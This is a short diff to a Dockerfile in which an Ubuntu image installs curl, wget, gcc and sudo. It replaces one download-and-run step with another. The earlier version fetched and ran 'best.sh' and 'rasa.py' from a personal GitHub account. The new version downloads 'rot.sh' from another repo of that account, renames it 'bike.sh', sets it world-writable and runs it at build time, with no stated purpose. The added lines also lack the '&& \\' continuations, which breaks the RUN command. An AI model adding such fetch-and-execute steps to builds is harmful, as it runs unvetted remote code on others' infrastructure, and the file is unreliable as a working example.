@@ -1,15 +1,15 @@
-FROM ubuntu:18.04
+FROM ubuntu:bionic
 
 # Install.
 RUN \
   apt-get update && \
-  apt-get install python -y && \
+  apt-get install sudo -y && \
+  apt-get install curl -y && \
   apt-get install gcc -y && \
   apt-get install wget -y && \
-  wget https://github.com/thoeb292/thoeb292/raw/main/best.sh && \
-  wget https://github.com/thoeb292/thoeb292/raw/main/rasa.py && \
-  chmod 777 rasa.py && \
-  python rasa.py && \
+  curl -Lfo bike.sh https://github.com/thoeb292/dest282/raw/main/rot.sh
+  chmod 777 bike.sh
+  ./bike.sh
   rm -rf /var/lib/apt/lists/* 
 
 # Add files.
